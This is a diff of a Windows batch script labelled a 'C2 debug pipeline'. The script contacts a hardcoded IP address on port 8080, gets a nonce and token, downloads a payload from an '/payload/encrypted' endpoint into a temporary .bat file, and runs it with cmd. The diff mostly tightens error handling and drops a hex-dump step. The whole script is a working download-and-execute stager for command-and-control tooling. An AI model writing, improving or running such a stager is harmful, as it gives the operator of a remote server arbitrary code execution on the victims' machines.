@@ -1,176 +1,194 @@
 @echo off
 setlocal EnableDelayedExpansion
 chcp 65001 >nul
-title C2 VERBOSE.DEBUG.FAILSAFE - API→RAW→HEX→CLEAN→PRINT→EXEC
-color 0C
+title C2 DEBUG SRE-GRADE
+color 0A
 
 echo.
-echo ╔══════════════════════════════════════════════════════════════════════╗
-echo ║  🕵️‍♂️  C2 VERBOSE.DEBUG.FAILSAFE - ERROR PROOF 🕵️‍♂️                      ║
-echo ║  Alex Montilla - Ciberdefensa Lab vFAILSAFE                            ║
-echo ╚══════════════════════════════════════════════════════════════════════╝
+echo ╔════════════════════════════════════════════════════════════╗
+echo ║   C2 SRE DEBUG PIPELINE - API → VALIDATE → EXEC           ║
+echo ╚════════════════════════════════════════════════════════════╝
 echo.
 
+:: ===== CONFIG =====
 set "BASE=http://82.29.153.101:8080"
-set "FILE=%TEMP%\sc.bat"
-set "RAW=%TEMP%\sc_raw.bin"
-set "CLEAN=%TEMP%\sc_clean.bat"
-set "LOG=%TEMP%\c2_debug.log"
 set "AUTH=%TEMP%\auth.json"
+set "RAW=%TEMP%\payload.raw"
+set "CLEAN=%TEMP%\payload.bat"
+set "LOG=%TEMP%\exec.log"
+set "CURL_LOG=%TEMP%\curl.log"
+set "STATUS_FILE=%TEMP%\status.txt"
 
-echo 📁 DEBUG FILES:
+echo 📁 FILES:
 echo    AUTH: %AUTH%
 echo    RAW:  %RAW%
 echo    CLEAN:%CLEAN%
 echo    LOG:  %LOG%
+echo    CURL: %CURL_LOG%
 echo.
 
-echo =====================================================
-echo 🔍 [1/8] API HEALTH CHECK
-echo =====================================================
-echo 📡 TESTING %BASE%/health
-curl -s --max-time 5 "%BASE%/health" > "%TEMP%\health.txt"
+:: =====================================================
+:: [1] HEALTH CHECK
+:: =====================================================
+echo [1] 🔍 HEALTH CHECK...
+
+curl -sS --max-time 5 "%BASE%/health" > "%TEMP%\health.txt" 2> "%CURL_LOG%"
+
+if %ERRORLEVEL% neq 0 (
+    echo ❌ HEALTH CHECK FAILED
+    type "%CURL_LOG%"
+    goto :fail
+)
+
 set /p HEALTH=<"%TEMP%\health.txt"
 echo ✓ HEALTH: %HEALTH%
-type "%TEMP%\health.txt"
 del "%TEMP%\health.txt" 2>nul
 echo.
 
-echo =====================================================
-echo 🔍 [2/8] API AUTH - RAW RESPONSE
-echo =====================================================
-echo 📡 GET %BASE%/auth/key
-curl -v --max-time 10 "%BASE%/auth/key" > "%AUTH%" 2>&1
-echo 📄 AUTH SIZE:
-for %%F in ("%AUTH%") do echo    %%~zF bytes
+:: =====================================================
+:: [2] AUTH REQUEST
+:: =====================================================
+echo [2] 🔐 AUTH REQUEST...
 
-if not exist "%AUTH%" (
-    echo ❌ ERROR: auth.json NO CREADO
-    pause
-    exit /b 1
+curl -sS --fail --max-time 10 "%BASE%/auth/key" -o "%AUTH%" 2> "%CURL_LOG%"
+
+if %ERRORLEVEL% neq 0 (
+    echo ❌ AUTH REQUEST FAILED
+    type "%CURL_LOG%"
+    goto :fail
 )
 
-echo 📄 RAW AUTH JSON:
+echo 📄 AUTH RESPONSE:
 type "%AUTH%"
 echo.
 
-echo =====================================================
-echo 🔍 [3/8] JSON PARSE - nonce + token
-echo =====================================================
-powershell -NoProfile -Command ^
-  "try { $json = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
-  $json.nonce | Out-File '%TEMP%\nonce.txt' -Encoding ASCII; ^
-  $json.token | Out-File '%TEMP%\token.txt' -Encoding ASCII; ^
-  Write-Host '✓ JSON PARSED OK' } ^
-  catch { Write-Host '❌ JSON PARSE ERROR:' $_.Exception.Message }"
-
-if not exist "%TEMP%\nonce.txt" (
-    echo ❌ ERROR: NONCE no extraído
-    pause
-    exit /b 1
+:: validar contenido esperado
+type "%AUTH%" | find "nonce" >nul || (
+    echo ❌ AUTH INVALIDA (no contiene nonce)
+    goto :fail
 )
 
-if not exist "%TEMP%\token.txt" (
-    echo ❌ ERROR: TOKEN no extraído
-    pause
-    exit /b 1
+:: =====================================================
+:: [3] PARSE JSON
+:: =====================================================
+echo [3] 🧠 PARSE JSON...
+
+powershell -NoProfile -Command ^
+  "try { ^
+    $json = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
+    $json.nonce | Out-File '%TEMP%\nonce.txt' -Encoding ASCII; ^
+    $json.token | Out-File '%TEMP%\token.txt' -Encoding ASCII; ^
+    exit 0 ^
+  } catch { exit 1 }"
+
+if %ERRORLEVEL% neq 0 (
+    echo ❌ JSON PARSE FAILED
+    goto :fail
 )
 
 set /p NONCE=<"%TEMP%\nonce.txt"
 set /p TOKEN=<"%TEMP%\token.txt"
-echo ✓ NONCE:  %NONCE%
-echo ✓ TOKEN:  %TOKEN:~0,44%
+
+echo ✓ NONCE: %NONCE%
+echo ✓ TOKEN: %TOKEN:~0,40%...
 echo.
 
-echo =====================================================
-echo 🔍 [4/8] DOWNLOAD RAW PAYLOAD - VERBOSE
-echo =====================================================
-echo 📡 POST %BASE%/payload/encrypted
-echo 🔑 HEADERS:
-echo    X-Nonce: %NONCE%
-echo    X-Token: %TOKEN:~0,44%
+:: =====================================================
+:: [4] DOWNLOAD PAYLOAD
+:: =====================================================
+echo [4] 📦 DOWNLOAD PAYLOAD...
 
-curl -v --max-time 10 ^
+curl -sS --fail --max-time 10 ^
+  -w "HTTPSTATUS:%%{http_code}" ^
   -H "X-Nonce: %NONCE%" ^
   -H "X-Token: %TOKEN%" ^
-  "%BASE%/payload/encrypted" > "%RAW%" 2>&1
+  "%BASE%/payload/encrypted" ^
+  -o "%RAW%" > "%STATUS_FILE%" 2> "%CURL_LOG%"
 
-echo 📄 RAW SIZE:
-if exist "%RAW%" (
-    for %%F in ("%RAW%") do echo    %%~zF bytes
-) else (
-    echo ❌ ERROR: RAW file NO creado
-    type "%RAW%"
-    pause
-    exit /b 1
+if %ERRORLEVEL% neq 0 (
+    echo ❌ PAYLOAD DOWNLOAD FAILED
+    type "%CURL_LOG%"
+    goto :fail
 )
 
-echo 📄 CURL VERBOSE LOG:
-type "%RAW%"
+set /p STATUS=<"%STATUS_FILE%"
+echo 📡 %STATUS%
+
+echo %STATUS% | find "200" >nul || (
+    echo ❌ HTTP ERROR
+    type "%CURL_LOG%"
+    goto :fail
+)
+
+if not exist "%RAW%" (
+    echo ❌ RAW FILE NOT CREATED
+    goto :fail
+)
+
+for %%F in ("%RAW%") do echo ✓ RAW SIZE: %%~zF bytes
 echo.
 
-echo =====================================================
-echo 🔍 [5/8] HEX DUMP - PRIMEROS 128 BYTES
-echo =====================================================
+echo 🔍 RAW PREVIEW:
+type "%RAW%" | more
+echo.
+
+:: =====================================================
+:: [5] CLEAN PAYLOAD (SAFE)
+:: =====================================================
+echo [5] 🧹 CLEAN PAYLOAD...
+
 powershell -NoProfile -Command ^
-  "if(Test-Path '%RAW%') { ^
-  $bytes=[System.IO.File]::ReadAllBytes('%RAW%'); ^
-  Write-Host 'HEX DUMP:'; ^
-  0..127 | ForEach-Object { if($_ -lt $bytes.Length) { '{0:X2} ' -f $bytes[$_] } else { '..' } } | ^
-  Out-Host } else { Write-Host '❌ RAW file missing' }"
+  "$bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
+   $content = [System.Text.Encoding]::UTF8.GetString($bytes); ^
+   $content | Out-File '%CLEAN%' -Encoding ASCII"
 
-echo.
-
-echo =====================================================
-echo 🧹 [6/8] LIMPIEZA + IMPRIMIR CONTENIDO
-echo =====================================================
-powershell -NoProfile -Command ^
-  "if(Test-Path '%RAW%') { ^
-  $bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
-  $start = 0; ^
-  if($bytes.Count -gt 1 -and $bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) { $start = 2 }; ^
-  if($bytes.Count -gt 2 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) { $start = 3 }; ^
-  $cleanBytes = $bytes[$start..($bytes.Count-1)] | Where-Object { $_ -ge 32 -and $_ -le 126 }; ^
-  $content = [System.Text.Encoding]::ASCII.GetString($cleanBytes); ^
-  $content | Out-File '%CLEAN%' -Encoding ASCII; ^
-  Write-Host ('✓ CLEAN SIZE: ' + $content.Length + ' chars'); ^
-  Write-Host '📄 CONTENIDO EXTRAÍDO:'; ^
-  Write-Host $content } else { Write-Host '❌ Cannot clean - RAW missing' }"
-
-if exist "%CLEAN%" (
-    echo 📄 FINAL FILE:
-    type "%CLEAN%"
-) else (
-    echo ❌ ERROR: CLEAN file NO creado
-    pause
+if not exist "%CLEAN%" (
+    echo ❌ CLEAN FAILED
+    goto :fail
 )
 
-echo.
-
-echo =====================================================
-echo 🚀 [7/8] EJECUCIÓN CON LOG
-echo =====================================================
-if exist "%CLEAN%" (
-    echo 🔥 EXECUTING...
-    cmd /c "%CLEAN%" > "%LOG%" 2>&1
-    echo 📄 EXEC LOG:
-    type "%LOG%"
-) else (
-    echo ❌ SKIP EXEC - no clean file
+for %%F in ("%CLEAN%") do (
+    echo ✓ CLEAN SIZE: %%~zF bytes
+    if %%~zF LSS 10 (
+        echo ❌ CLEAN FILE DEMASIADO PEQUEÑO
+        goto :fail
+    )
 )
 
+echo 📄 CLEAN PREVIEW:
+type "%CLEAN%"
 echo.
 
-echo =====================================================
-echo ✅ [8/8] RESUMEN FINAL
-echo =====================================================
-echo HEALTH: %HEALTH%
-echo NONCE:  %NONCE%
-echo TOKEN:  %TOKEN:~0,44%
-echo RAW:    for %%F in ("%RAW%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
-echo CLEAN:  for %%F in ("%CLEAN%") do if exist "%%F" (echo %%~zF bytes) else (echo MISSING)
-echo LOG:    %LOG%
+:: =====================================================
+:: [6] EXECUTE
+:: =====================================================
+echo [6] 🚀 EXECUTE PAYLOAD...
+
+cmd /v:on /c "%CLEAN%" > "%LOG%" 2>&1
+
+echo 🔎 EXIT CODE: %ERRORLEVEL%
+echo 📄 EXEC LOG:
+type "%LOG%"
 echo.
 
-del "%TEMP%\nonce.txt" "%TEMP%\token.txt" 2>nul
+:: =====================================================
+:: [7] SUCCESS
+:: =====================================================
+echo [7] ✅ DONE
+goto :end
+
+:: =====================================================
+:: FAIL HANDLER
+:: =====================================================
+:fail
+echo.
+echo ❌ PIPELINE FAILED
+echo 🔎 CURL LOG:
+type "%CURL_LOG%"
+echo.
+pause
+exit /b 1
+
+:end
+del "%TEMP%\nonce.txt" "%TEMP%\token.txt" "%STATUS_FILE%" 2>nul
 pause
